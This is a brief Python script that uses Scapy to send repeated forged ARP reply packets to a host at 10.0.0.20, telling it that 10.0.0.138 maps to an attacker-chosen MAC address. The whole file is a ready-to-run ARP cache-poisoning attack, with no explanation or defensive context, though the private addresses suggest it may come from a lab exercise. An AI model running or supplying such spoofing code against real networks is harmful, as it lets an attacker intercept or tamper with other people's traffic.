from scapy.all import *


for i in range(1, 255):
	pkt = Ether()/ARP(op=2, hwsrc="08:00:27:33:75:72", psrc="10.0.0.138", pdst="10.0.0.20")
	sendp(pkt)
